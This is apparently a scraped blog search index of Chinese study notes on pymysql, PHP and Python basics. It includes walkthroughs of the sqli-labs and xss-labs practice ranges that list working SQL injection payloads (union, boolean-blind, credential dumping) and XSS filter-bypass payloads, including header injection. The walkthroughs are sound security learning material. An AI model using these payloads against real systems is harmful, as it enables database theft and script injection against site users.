MySQL交互/","permalink":"https://yzlsjr.github.io/2024/11/03/Python%20MySQL%E4%BA%A4%E4%BA%92/","excerpt":"","text":"Python MySQL交互模块：pymysql 创建连接connection对象（建立与数据库的连接） 创建对象：调用connect()方法 1con = connect(参数列表) 参数 host：连接的 mysql 主机，如果本机就是 localhost port：连接的 mysql 主机的端口，默认是 3306 database：数据库的名称 user：连接的用户名 password：连接的密码 对象的方法 close() 关闭连接 commit() 提交 执行增删改查的时候要带上 cursor() 返回 cursor 对象，用于执行 sql 语句并获得结果 使用游标的操作步骤 首先，使用pymysql连接上mysql数据库，得到一个数据库对象。 然后，我们必须要开启数据库中的游标功能，得到一个游标对象。 接着，使用游标对象中的execute()方法，去执行某个SQL语句，系统会根据我们输入的SQL语句，找到这些匹配行，存储起来，而不是一次性的打印到屏幕上。当我们什么时候需要这个结果中的数据的时候，我们就去获取它。 最后，获取结果集中的数据。1.**fetchone()**，该方法一次获取一条记录，每一条记录是一个元组形式的数据，每获取一条记录游标会往前移动一格，等待获取下一条记录；2.**fetchall()**，能够一次性的获取所有的数据，该方法返回的是一个元组列表。 当完成所有操作后，断开数据库的连接，释放资源。 一个简单的使用模板 123456789101112131415import pymysql # 使用pymysql连接上mysql数据库服务器，创建了一个数据库对象，db表示要连接的具体数据库名；db = pymysql.connect(host=&#x27;localhost&#x27;,user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;&#x27;, charset=&#x27;utf8&#x27;)# 开启mysql的游标功能，创建一个游标对象； cursor = db.cursor()# 要执行的SQL语句；sql = &quot;&quot;# 使用游标对象执行SQL语句；cursor.execute(sql)# 使用fetchone()方法，一条一条的获取返回的结果，但是需要用变量保存返回结果；data = cursor.fetchone()# 断开数据库的连接，释放资源；db.close()","categories":[],"tags":[]},{"title":"SQL注入","slug":"SQL注入","date":"2024-11-03T04:34:21.606Z","updated":"2024-11-17T07:01:23.146Z","comments":true,"path":"2024/11/03/SQL注入/","permalink":"https://yzlsjr.github.io/2024/11/03/SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SQL注入🚀预备知识SQL语法表Websites 123456789+----+--------------+---------------------------+-------+---------+| id | name | url | alexa | country |+----+--------------+---------------------------+-------+---------+| 1 | Google | https://www.google.cm/ | 1 | USA || 2 | 淘宝 | https://www.taobao.com/ | 13 | CN || 3 | 菜鸟教程 | http://www.runoob.com/ | 4689 | CN || 4 | 微博 | http://weibo.com/ | 20 | CN || 5 | Facebook | https://www.facebook.com/ | 3 | USA |+----+--------------+---------------------------+-------+---------+ &#x3D;&#x3D;SELECT(选取数据)&#x3D;&#x3D; SELECT的结果储存在一个结果表中，称为结果集。 12SELECT column1，...FROM table_name; 和 1SELECT * FROM table_name 参数说明： **column1, column2, …**：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。 table_name：要查询的表名称。 *****: 通配符，表示选择表中的所有列。 &#x3D;&#x3D;WHERE(提取满足条件的记录)&#x3D;&#x3D; 123SELECT column1, column2, ...FROM table_nameWHERE condition; 实例： 1SELECT * FROM Websites WHERE country=&#x27;CN&#x27;; SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。 在上个实例中 ‘CN’ 文本字段使用了单引号。 如果是数值字段，不要使用引号。 &#x3D;&#x3D;AND&amp;OR运算符&#x3D;&#x3D; 如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。 如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。 可以把 AND 和 OR 结合起来（使用圆括号来组成复杂的表达式）。 从 “Websites” 表中选取 alexa 排名大于 “15” 且国家为 “CN” 或 “USA” 的所有网站： 123SELECT * FROM WebsitesWHERE alexa &gt; 15AND (country=&#x27;CN&#x27; OR country=&#x27;USA&#x27;); &#x3D;&#x3D;DROP&#x3D;&#x3D; DROP INDEX 12DROP INDEX [IF EXISTS] index_nameON TABLE_NAME 参数说明： DROP INDEX：表示要删除索引的操作。 IF EXISTS：是一个可选的子句，用于检查索引是否存在。如果存在，就执行删除操作；如果不存在，不会报错。 index_name：要删除的索引的名称。 ON table_name：指定包含要删除索引的表的名称。 删除索引可能会影响数据库的查询性能 DROP TABLE(删除表) 1DROP TABLE [IF EXISTS] TABLE_NAME; 执行DROP TABLE将永久删除表和其所有数据 DROP DATABASE（删除数据库） 1DROP DATABASE [IF EXISTS] database_name; 永久删除整个数据库及其所有相关数据 ✈️SQL注入基本原理简单来说就是利用技巧，将原本要执行的SQL查询语句更改 例：在一个简单的登录表单中，用户输入用户名和密码，服务器端可能执行如下SQL查询： 1SELECT * FROM users WHERE username = &#x27;input_username&#x27; AND password = &#x27;input_password&#x27;; 如果提交的用户名为admin&#39; -- 注释符--后面的文本被注释，实际上该查询变成了 1SELECT * FROM users WHERE username = &#x27;admin&#x27;; 攻击者无需正确的密码即可登录 与此类似的 1&#x27; OR (SELECT COUNT(*) FROM admins) &gt; 0 -- 若admin表中有记录，则该条件为真，不需要正确的密码即可登录 🚌注入类型联合查询注入 使用UNION语句来组合来自其他表的数据。 例如： 1SELECT name, email FROM users WHERE id = 1 UNION SELECT credit_card_number, 1 FROM credit_cards; 这会将信用卡信息与合法查询的结果组合在一起，泄露敏感信息。 布尔盲注入 利用布尔条件推测数据库信息。改变输入的内容并观察响应来判断后台SQL查询是否执行成功。 例如： 12SELECT * FROM users WHERE id = 1 AND 1=1; -- 返回正常结果SELECT * FROM users WHERE id = 1 AND 1=2; -- 返回空结果 通过这种方式，可以逐步推测出数据库结构和内容。 时间盲注入 使用数据库的延迟响应来推测SQL查询的执行情况。 例如： 1SELECT * FROM users WHERE id = 1 AND IF(1=1, SLEEP(5), 0); 如果页面延迟5秒返回，说明条件为真。 报错注入 页面有数据库报错信息时可用 函数 1234updatexml(xml_target, xpath_expr, new_value)xml_target：要操作的 XML 数据。xpath_expr：用于定位 XML 中特定部分的 XPath 表达式。new_value：要更新的内容。 当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。 要结合其他函数使用 sqli-labs靶场第一关 本关提示我们输入id?id=1该关传参id，不同的数字显示不同的用户。 接下来判断SQL语句是否拼接，是字符型还是数字型。原因：数字型一般不需要&#39;&#39;包裹 查看文件发现并没有什么过滤限制，且该页面存在回显，可以使用联合查询，先确定列数，直接order by ，具体payload?id=1&#39; order by number --+ 注：这里为什么是+号，因为注释符后要有分隔符（空格，换行符等）来结束注释，在URL中空格被编码为+，所以采用加号或者%20 判断列数这里进行测试?id=1&#39;order by 4--+发现 进行报错，所以这个表最大有三列 判断回显位置就是看哪一列是能显示的 payload：?id=-1&#39;union select 1,2,3 --+ 当union前面的语句为false，才会执行后面的语句 判断库名payload：?id=-1&#39;union select 1,2,database()--+ 库名：security 判断版本号?id=-1&#39; union select 1, 2,version() --+ 版本号：5.7.26 判断表名字（爆表）?id=-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+ 是啥意思呢，首先information_schema.tables中储存了所有数据库中的表信息，where后面是限定条件查询数据库的名称为security，这个语句的意思就是把security库中所有的表显示出来。 爆字段名?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+ 跟爆表差不多 一开始我不知道为啥这么多内容，想了一下去看了下本地的数据库，发现是有其他库的表也有users，可以改一下payload ?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;--+ 这样就可以了 爆出数据payload：?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--+ 流程第一次进行完整的SQL注入 🦉&#x3D;&#x3D;判断注入类型——字符or数字&#x3D;&#x3D; 数字型： 1 and 1&#x3D;1 (能回显) 1 and 1&#x3D;2 (不能回显) 字符型： 1’ and 1&#x3D;1# (能回显） 1’ and 1&#x3D;2# （不能回显） 🦉&#x3D;&#x3D;判断闭合方式——单引号还是双引号闭合&#x3D;&#x3D; 可以通过报错显示的引号类型判断 🦉&#x3D;&#x3D;判断列数&#x3D;&#x3D; ?id&#x3D;1’ order by 3–+ 🦉&#x3D;&#x3D;判断报错位置&#x3D;&#x3D; ?id&#x3D;-1’ union select 1,2,3–+ 🦉&#x3D;&#x3D;判断库名&#x3D;&#x3D; ?id&#x3D;-1’ union select 1,2,database() –+ 🦉&#x3D;&#x3D;判断版本号&#x3D;&#x3D; ?id&#x3D;-1’ union select 1, 2,version() –+ 🦉&#x3D;&#x3D;判断表名字&#x3D;&#x3D; ?id&#x3D;-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+ 🦉&#x3D;&#x3D;判断字段名&#x3D;&#x3D; ?id&#x3D;-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+ 🦉&#x3D;&#x3D;爆出数据&#x3D;&#x3D; ?id&#x3D;-1’ union select 1,2,group_concat(username ,id , password) from users–+ 第二关——第四关第二关基本与第一关相同，但是是数字型，不用加单引号 第三关是字符型，且闭合使用&#39;)，其他基本相同 第四关是双引号字符型且有括号 第五关 有错误时 没错误时 只对请求对错有显示，其他没显示，可以考虑布尔盲注入 判断数据库的长度?id=1&#39;and length((select database()))&gt;4--+不断更改判断的值，直到可以判断出数据库的长度 判断数据库名称?id=1&#39;and ascii(substr((select database()),1,1))=115--+ substr(a,b,c),a是要截取的字符串，b是截取的位置，c是截取的长度，因为我们得一个字符一个字符得进行判断所以得设为1，转换为ASCII码值 爆表名长?id=1&#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+ 判断所有表名字符长度。 爆表名内容?id=1&#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+ 逐一判断表名 爆字段名长?id=1&#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20--+判断所有字段名的长度 爆字段名?id=1&#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99--+逐一判断字段名。 爆字段内容长度1?id=1&#39; and length((select group_concat(username,password) from users))&gt;109--+ 判断字段内容长度 爆出数据内容?id=1&#39; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+ 逐一检测内容。 布尔盲注入总结基本是两个过程，判断数据长，然后一个字母一个字母地推","categories":[],"tags":[]},{"title":"PHP学习","slug":"PHP learning","date":"2024-05-14T10:57:25.721Z","updated":"2024-05-16T13:29:24.753Z","comments":true,"path":"2024/05/14/PHP learning/","permalink":"https://yzlsjr.github.io/2024/05/14/PHP%20learning/","excerpt":"","text":"PHP语法PHP脚本以&lt;?php开始，以?&gt;结束 PHP中每个代码行都必须以分号结束。 通过PHP，有两种在浏览器输出文本的基础指令：echo和print &#x2F;&#x2F;单行注释 &#x2F;* *&#x2F;多行注释 PHP变量变量规则 变量以$符号开始，后面是变量的名称 变量名必须以字母或下划字符开始 变量名只能包含字母，数字以及下划线，不能空格 区分大小写 声明变量无，赋值的时候变量被创建 echo和print语句区别 echo - 可以输出一个或多个字符串 print - 只能输出一个字符串，返回值总为1 （echo的输出速度要比print快echo没有返回值，print有返回值为1） 注： 12345&lt;?phpecho &quot;abc&quot;,&quot;def&quot;,&quot;xyz&quot;;输出效果 abcdefxyz?&gt; PHP类型比较比较有意思 包括松散比较和严格比较 松散比较：两个等号，只比较值，不比较类型 严格比较：三个等号，除了值也比较类型 PHP常量设置常量，需要使用define()函数 1define(string $name,mixed $value) name:常量名称 value：常量的值 例 123define(myname,yzl);echo myname;//结果输出“yzl” 注：常量是全局的 PHP字符串12$txt = &quot;Hello World!&quot;;echo $txt; 注：赋值时加上双引号或单引号 并置运算符（.）用于将两个字符串连接起来 1234$txt1 = &quot;hello world!&quot;;$txt2 = &quot;what a nice day!&quot;;echo $txt1.$txt2;//将输出Hello world!What a nice day! strlen()函数返回字符串长度 strpos()函数查找函数 1echo strpos(&quot;hello world!&quot;,&quot;world&quot;) 从字符串’hello world!’中查找文本”world” 如果找到匹配，该函数会返回第一个匹配字符的位置。如果未匹配到返回FALSE 上面的示例中将输出：6（字符串中第一个字符的位置是0） if语句123456789101112if (条件)&#123; if 条件成立时执行的代码;&#125;elseif (条件)&#123; elseif 条件成立时执行的代码;&#125;else&#123; 条件不成立时执行的代码;&#125; switch语句12345678910111213&lt;?phpswitch (expression) &#123; case value1: // 代码块1 break; case value2: // 代码块2 break; // 更多的 case 语句 default: // 如果没有匹配的值&#125;?&gt; expression 是要被比较的表达式。 case value: 是可能的值，如果 expression 的值等于某个 case 的值，就执行相应的代码块。 break; 用于终止 switch 语句，防止继续执行下一个 case。 default: 是可选的，用于指定当没有匹配的 case 时执行的代码块。 数组","categories":[],"tags":[]},{"title":"xss靶场","slug":"xss-labs","date":"2024-04-08T09:40:04.935Z","updated":"2024-05-13T14:22:27.063Z","comments":true,"path":"2024/04/08/xss-labs/","permalink":"https://yzlsjr.github.io/2024/04/08/xss-labs/","excerpt":"","text":"添加标签得闭合前面的标签 小写转化并删除关键字可以采用双拼写法 第一关观察到网址中“？”后name=test， 尝试简单的标签插入，输入&lt;Script&gt;alert(1)&lt;/script&gt;后显示过关，查看源码发现，name的值插入到了html里头，还将输入的值的长度显示了出来 第二关在搜索框里再次输入&lt;Script&gt;alert(1)&lt;/script&gt;尝试一下发现他显示在了屏幕里没有弹窗，查看源代码得知 “&lt;“”&gt;“被实体转义，但是只有一个被转义，另一个被引号包裹，所以只需要将双引号闭合掉即可，输入&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&quot; 第三关查看源码， 发现输入的内容被单引号括起来了，所以尝试输入&#39;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&#39;发现特殊符号被实体转义了，所以我们可以考虑input标签的一些特殊事件如onkeypress onkeydown onfocus 以onfocus为例借助JavaScript伪协议输入&#39; onfocus=javascript:alert() &#39; 之后再点击一下输入框就可以了，但如果不借助伪协议的话，双引号会被实体转义 第四关第四关和第三关差不多，输入&#39; onfocus=javascript:alert() &#39;后查看源码发现输入内容是被双引号包裹，所以将单引号换成双引号即可，同时查看源码得知这一关是将尖括号直接删除掉了，所以仿照第三关但不借助伪协议也可以绕过尖括号 第五关尝试输入&#39; onfocus=javascript:alert() &#39; 发现网页在on中间加了一个下划线，输入&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&quot;发现script中间也加了下划线，但他并没有过滤尖括号所以可以尝试其他标签如a标签的href属性构造payload&quot;&gt; &lt;a href=javascript:alert()&gt;123&lt;/a&gt; &lt;&quot;,之后再点击123即可 第六关输入上一关的payload发现href被过滤掉了，再输入前几关的payload尝试发现很多都被过滤掉了，但发现大小写没有被过滤掉，所以这题可以用大小写绕过，将前几关的payload加上大小写构造新的payload&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;或&quot;Onfocus=javascript:alert() &quot;或&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot; 第七关首先我们可以将之前payload的一些可能被过滤的关键字试一下如&quot; &lt;sCRipt&gt; OnFocus &lt;a hREf=javascript:alert()&gt; &quot;发现这些输入的值变成了&quot; &lt;&gt; focus &lt;a =java:alert()&gt; &quot;， 所以这一关进行了小写转化并且将on，script，href都给删掉了，所以可以考虑双拼写法将on写成oonn，script写成scrscriptipt，可以绕过去，输入&quot;&gt; &lt;Scrscriptipt&gt;alert()&lt;/scrscriptipt&gt; &lt;&quot;即可 第八关先输入关键字尝试一下如&quot; Src DaTa &lt;sCRipt&gt; OnFocus &lt;a hREf=javascript:alert()&gt; &quot;查看源码 我们输入的内容会直接带入href，点击友情链接的时候，就会执行我们带入的内容，同时这一关添加了小写转化函数，还过滤掉了src、data、on···、href、script、（双引号），他没有过滤[&amp;#；]所以我们还可以对script进行HTML编码，找一个编码工具（[MaTools](在线Unicode编码解码 - 码工具 (matools.com))）把script转义一下子， 输入java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert()点一下添加友情链接然后再点击一下友情链接就可以了 第九关将第八关答案输入进去发现不行，查看源码发现href标签里插入不进去再查看这一关的源码，发现有一句 if(false===strpos($str7,&#39;http://&#39;)也就是说输入的内容里如果没有http:&#x2F;&#x2F;就会执行if语句，所以我们在输入的语句中要包含http:&#x2F;&#x2F;，并且要用注释符包裹起来 第十关我们再次先输入一些关键字在网址栏&quot; Src DaTa &lt;sCRipt&gt; OnFocus &lt;a hREf=javascript:alert()&gt; &amp;# &quot;发现全部被过滤掉了，查看源码发现有三个参数，get传参可能传到任何一个里，只能看一下这一关的PHP文件， 看到get传参t_sort,并且过滤掉了&lt;&gt;,标签插入之后不能闭合，但还是可以考虑onfocus事件，这里输入框添加了隐藏属性，需要添加type&#x3D;”text”。构造payloadt_sort=&quot; onfocus=javascript:alert() type=&quot;text 我们也可以对这三个参数依次进行传参，有回显的那个就是get传参对象,输入t_link=&quot;666&quot;&amp;t_history=&quot;777&quot;&amp;t_sort=&quot;888&quot; 第十一关查看页面源代码 第四个被隐藏的input标签的value中显然是上一个页面的也就是第十关的网址，我们可以猜测这里的内容是Referer头中的参数，用BurpSuite抓一下包，添加Referer头，其中的参数改为我们构造的payload，但首先需要测试一下它过滤了哪些东西。 1Referer: &quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106; 之后我们发现&lt;&gt;被删除了，但我们可以构建onfocus事件 1Referer: &quot; onfocus=javascript:alert() type=&quot;text 第十二关 这关是在User-Agent上做文章，构造方法基本和上关相同 第十三关这关是在cookie上动手脚，也基本和11关相同 第十四关 iframe标签属性里面含有xss代码的图片，以达到弹窗的效果，该图片是一种特殊的图片类型，可以在图片上添加一些属性，我们将payload写在图片属性里就可以完成绕过，但是这里调用已经失效了，无法进行测试 iframe标签（内嵌框架）用于将一个网页嵌入到另一个网页中，它可以在一个页面中显示来自其他页面的内容。 第十五关","categories":[],"tags":[]},{"title":"Python学习","slug":"python学习","date":"2024-04-07T13:56:04.546Z","updated":"2024-04-08T08:36:28.941Z","comments":true,"path":"2024/04/07/python学习/","permalink":"https://yzlsjr.github.io/2024/04/07/python%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"一.查询数据类型type=(&quot;&quot;)变量无类型查的是数据类型语句有返回值便可以被赋值 name1=type(name) 二.数据类型转换 语句 说明 int(x) 将x转成整数 float(x) 将X转成浮点数 str(x) 将x转成字符串 三.标识符数字不可以作为开头 四.字符串拼接 字符串用加号拼接，不能和其它类型用加号拼接 1print(&quot;我是&quot;+&quot;黑马&quot;) 占位式拼接(可以不同类型) 123name = 999message = &quot;两人%s&quot; % nameprint(message) 多变量占位，变量要用括号括起来，并按占位顺序填入 1234i = 2t = 3a = &quot;我%s岁了，他%s岁了&quot; % (i,t)print(message) 符号 转化 %s 转为字符串放入 %d 转为整数放入 %f 转为浮点数放入 精度控制 .n控制小数点精度（&#x3D;&#x3D;同时会对小数部分进行四舍五入&#x3D;&#x3D;） m控制宽度（m若比数字本身宽度还小，则不生效） 例：对11.35设置了**%7.2f后，结果是：[空格][空格]11.35**,两空格补足宽度。 快速字符串格式化 语法：f”内容{要拼接的变量}” 123a=1b=4.66print(f&quot;我&#123;a&#125;岁了，他&#123;b&#125;岁了&quot;) &#x3D;&#x3D;但数字变量不做精度控制，原样输出&#x3D;&#x3D; 表达式格式化 表达式：一条具有明确执行结果的代码语句 1print(&quot;1 * 1的结果是:%d&quot; % (1 * 1)) 六.input语句input(“提示语句”) input中不管输入什么都视为字符串 七.随机数random 12import randomnum = random.randint(1,10) 八.for循环(遍历循环，依次取出)1234name = yangziliang for x in name: print(x) ​ 将name中的内容，挨个取出赋予x临时变量​ 就可以在循环体内对x进行处理 九.rangerange(num)获得一个数字序列从0开始，不含numrange(num1,num2)获得一个数字序列不含num2range(num1,num2,step)获得一个数字序列不含num2,且数字之间的步长，以step为准，默认step为1 十.continue中断本次循环，直接进入下一次 1234for i in range(1,100): 语句一 continue 语句二 上面代码中语句二不会执行 十一.break跳出所在循环 十二.函数1.函数的定义123def 函数名 (传入参数)： 函数体 return 返回值 2.函数的调用函数名(参数) 3.传入参数功能：在函数进行计算时，接受外部（调用时）提供的数据 1234def add(x,y): result = x + y print(f&quot;&#123;x&#125; + &#123;y&#125;的结果是：&#123;result&#125;&quot;)add(5,6) def add(x, y)中x和y称为形参，表示函数声明将要使用两个参数 参数之间用逗号隔开 函数调用中提供的5和6称为实参，表明函数执行时真正使用的参数值 4.返回值语法： 1234def 函数名(参数···): 函数体 return 返回值变量 = 函数(参数) 写不写return,函数都有返回值，不写的时候返回None None用在if判断中，None等同于False 用于声明无内容的变量上 定义变量但暂时不需要变量有具体值，可以用None来代替 1name = None 5.函数说明文档1234567def add(x y): &quot;&quot;&quot; 函数功能···· :param x:表示 :param y:表示 :return: &quot;&quot;&quot; 将鼠标悬停在函数名或者参数上可以看到说明文档 6.变量作用域两类：局部变量和全局变量 局部变量指定义在函数体内部的变量，只在函数体内部生效，在函数体内使用完便会销毁，无法在函数体外发挥作用 全局变量，函数体内外都可生效，定义在函数体外即可 如何在函数体内修改全局变量 答：在函数体内写上global 要修改的全局变量 数据容器1.列表1. 变量名称 = [元素一，元素二，元素三······] 空列表变量名称 = []变量名称 = list() 列表可以一次存储多个数据，且可以为不同的数据类型，&#x3D;&#x3D;支持嵌套&#x3D;&#x3D; 列表下标 正向从0开始，反向从-1开始 嵌套下标 123list1 = [[1,2,3],[4,5,6]]# 输出5的格式为print(list1[1][1]) 方法 将函数定义为clss(类)的成员，那函数会称之为：方法 123# 函数def add(x,y): return x + y 1234# 方法class Sudent: def add(self,x,y): return x + y 方法的使用 12student = student()num = student.add(1,2) &#x3D;&#x3D;列表的常用操作&#x3D;&#x3D; 查找某元素的下标索引（正向） 语法：列表.index(元素) 修改特定位置的元素值 语法：列表[下标]&#x3D;值 插入元素 语法：**列表.insert(下标，元素)**，在指定的下标位置（插入后元素要代替的位置）插入指定元素 追加元素（追加到队尾） 语法1：列表.append(元素) 语法2：列表.extend（其他数据容器），将其他数据容器中的内容追加到列表尾部 删除元素 语法1：del列表[下标] 语法2：列表.pop(下标)，将元素提出来并将其从列表中剔除，并可以将剔除元素接收 语法3：列表.remove(元素)，删除某元素在列表中的第一个匹配项（从前到后寻找第一个符合的元素并删除） 清空元素 语法：列表.clear() 统计某元素在列表中的数量 语法：列表.count(元素) 列表内有多少元素 语法：len.(列表) 列表的遍历 while 12345index = 0while index &lt; len(列表): 元素 = 列表[index] 对元素进行处理 index += 1 for 12for 临时变量 in 数据容器: 对临时变量进行处理 2.元组 定义 变量名称 &#x3D; （元素，元素，······） 空元组 变量名称 &#x3D; （） 变量名称 &#x3D; tuple() 注：定义单个元素必须加一个逗号 嵌套 123t = ((1,2,3),(4,5,6))# 将4取出t4 = t[1][0] 元组操作 查找 元组名.index（） 统计某个数据出现的次数 元组名.count() 统计元素个数 len(元组) 修改元组内容 正常来说不可修改 元组内嵌套list可以被修改 3.字符串同样不可修改 查找 名称.index() (若查找多个，查找到的是起始下标) 替换语法：&#x3D;&#x3D;字符串.replace(字符串1，字符串2)&#x3D;&#x3D;功能：将字符串内的全部：字符串1，替换为字符串2注：是得到了一个新字符串，可以被接收 字符串的分割 语法：&#x3D;&#x3D;字符串.split(分隔符字符串)&#x3D;&#x3D;功能：按照指定的分隔符字符串，将字符串划分为多个字符串，并存入列表对象中注意：字符串本身不变，而是得到了一个列表对象 字符串的规整操作 （1）去首尾空格及换行符 语法：字符串.strip() 12my_str = &quot; itheima &quot;print(my_str.strip(&quot;12&quot;)) # 结果：&quot;itheima&quot; （2）去前后指定字符串 ​ 语法：字符串.strip(字符串) 12my_str = &quot;12itheima21&quot;print(my_str.strip(&quot;12&quot;)) # 结果：&quot;itheima&quot; 统计 名称.count() 长度(包括空格) 名称.len() 4.序列 切片（不会影响原本）语法：序列[起始下标：结束下标：步长]不包含结束下标，步长若为负，则从后往前特殊： 12my_str = &quot;123456&quot;result = my_str[::-1] 等同于将序列反转 123my_str = &quot;万过薪月，员序程马黑来，nohtyp学&quot;# 得到黑马程序员result = my_str.split(&quot;，&quot;)[1].replace(&quot;来&quot;,&quot;&quot;)[::-1] 5.集合(不支持下标索引) 变量名&#x3D;{元素，元素···} 空集合&#x3D;set() 操作： 添加元素：名称.add() 删除元素：名称.remove() 随机取出一个元素（原本元素被删除）：名称.pop() 清空：名称.clear（） 取两个集合的差集：语法：集合1.diffience(集合2) 集合1为基准，取出集合1里有而集合2里没有的元素，集合1，2不发生变化 123set1 = &#123;1,2,3&#125;set2 = &#123;1,5,6&#125;set3 = set1.diffience(set2) 消除两个元素的差集 语法：集合1.diffience_update(集合2) 功能：对比集合1和集合2，在集合1内，删除和集合2相同的元素 结果：集合1被修改，集合2不变 集合合并 语法：集合1.unior（集合2） 功能：将集合1和集合2合成新集合 结果：原集合1，2不变，得到新集合 len（集合），求不重复元素个数 字典(不支持下标索引) 语法 1my_dict = &#123;key:value,key:value······&#125; 空字典： my_dict = &#123;&#125; my_dict = dict() 嵌套 123456789101112my_dict = &#123; &quot;某1&quot;：&#123; &quot;语文&quot;:77, &quot;数学&quot;:88, &quot;英语&quot;:99 &#125;, &quot;某2&quot;:&#123; &quot;语文&quot;:66, &quot;数学&quot;:55, &quot;英语&quot;:33 &#125;&#125; 若要查询某1的语文成绩 1my_dict[&quot;某1&quot;][&quot;语文&quot;] 操作 新增元素 字典[key] &#x3D; value 注：字典key不可重复，对已存在的key操作则会覆盖原有值 删除元素 字典.pop(key),结果：获得指定key的value，同时删除他 清空元素 字典.clear() 获取全部的key 字典.keys() 字典内key的个数 len() 数据容器通用操作 max（容器），统计容器内最大元素 min（容器），统计容器内最小元素 转换功能 list（容器） 转列表 tuple（容器） 转元组 str（容器） 转字符串 set（容器） 转集合 字典转字符串可以保留value 定容器排序功能（结果会转成列表）（a比A大） sorted（容器，[reverse&#x3D;Ture]）默认为false 函数进阶多返回值12345def return2(): return 1,2x,y = return2()print(x)print(y) 传参 位置传参 按顺序传参 关键字传参 “键&#x3D;值”形式传参，可以不按顺序 注：函数调用时，如果有位置参数，位置参数必须在关键字参数之前 缺省参数 在定义函数时直接为参数提供默认值（必须都在最后），调用时若不传参数则使用缺省参数对应的值 1def user_info(mame,age,gender=&#x27;男&#x27;) 不定长传参类型 位置不定长传参 * 号 12def user-info(*args): print(args) 传进去的所有参数都会被args变量收集，他会根据传进参数的位置合并为一个元组，这就是位置传递 关键字不定长传参 以** 标记一个形式参数，以字典的形式接收参数，形式参数一般命名为kwargs 匿名函数 函数作为参数传递 与普通函数不同的是，确定的数据相同而计算这几个数据的逻辑不同，我们要传入的是一个计算逻辑 lambda匿名函数 lambda关键字可以定义匿名的函数（无名称） 只可临时使用一次 语法：lambda 传入参数：函数体（只能一行代码） 文件操作文件的编码将内容翻译为二进制 密码本默认为UTF-8 文件的读取 open函数（打开一个已经存在的文件或者创建一个新文件） 语法：（文件对象名）&#x3D; open(name,mode,encoding) name:是要打开的目标文件名的字符串（可以包含文件所在的具体路径）。 mode：设置打开文件的模式：只读，写入，追加等 模式 描述 r 以只读方式打开文件（默认） w 打开一个文件只用于写入，如果该文件已存在则打开并从头开始编辑，删除原有内容；如果该文件不存在，创建新文件 a 打开一个文件用于追加。如果该文件已存在，新内容将会被写入到已有内容之后；如果该文件不存在，创建新文件进行写入 encoding（用关键字传参）：编码格式（推荐UTF-8） 读相关方法 read()方法 文件对象.read(num) num表示要从文件中读取的数据的长度（单位是字节），如果没有传入num,那么就表示读取文件中所有数据 readlines（）方法 readlines可以按照行的方式把文件的内容进行一次性读取，并且返回的是一个列表，每一行的数据为一个元素 注：如果调用多个read，下一次read会从上一次结尾处开始 readline（）方法 一次读取一行内容 遍历readline 12for i in 文件对象名: 对列表内元素的操作 文件的关闭 文件对象名.close（） with open(name,mode,encoding) as 文件对象名: 对文件的操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 执行完`with open`中的操作后自动关闭文件## 文件的写入* 文件写入 文件对象名.write(内容)* 内容刷新 文件对象名.flush()* 文件的关闭 文件对象名.close() 注：close中包含flush功能* 注意：若文件不存在，则创建新文件；若存在，则删除原内容再进行写入## 文件的追加a模式* 文件写入 文件对象名.write(内容)* 内容刷新 文件对象名.flush()* 文件的关闭 文件对象名.close()# python异常，模块与包## 捕获常规异常语法：```pythontry: 可能发生错误的代码except: 如果出现异常执行的代码 捕获指定异常基本语法： 1234try: print(name)except NameError as e: print(&#x27;name变量名称未定义错误&#x27;) 注： 如果尝试执行的代码异常类型和要捕获的异常类型不一致，则无法捕获异常 一般try下方只放一行尝试执行的代码 捕获多个异常把要捕获的异常类型的名字，放到except后，并使用元组的方式进行书写 1234try: ...except (NameError,ZeroDivisionError) as e: print(&#x27;...&#x27;) 捕获所有异常1234try: ...except Exception as e: print(&#x27;...&#x27;) else123456try: ...except Exception as e: print(&#x27;...&#x27;)else: 没有异常就执行这个 finally12345678try: ...except Exception as e: print(&#x27;...&#x27;)else: 没有异常就执行这个finally: 无论是否异常都执行 python模块 基础语法1： import 模块名 import 模块名1，模块名2 模块名.功能名（） 基础语法2： from 模块名 import 功能名 使用时就可以只写功能名，不用写.了 from 模块名 import * *表示全部的意思 也不用写.了 as改别名 import 模块名 as 别名 from 模块名 import 功能名 as 别名 自定义模块main变量 模块调试的时候会执行，从其他文件调用的时候不执行 all变量 在使用*的时候会受到all变量的限制 python包文件夹 必须有—init—.py这个文件 调用时 import 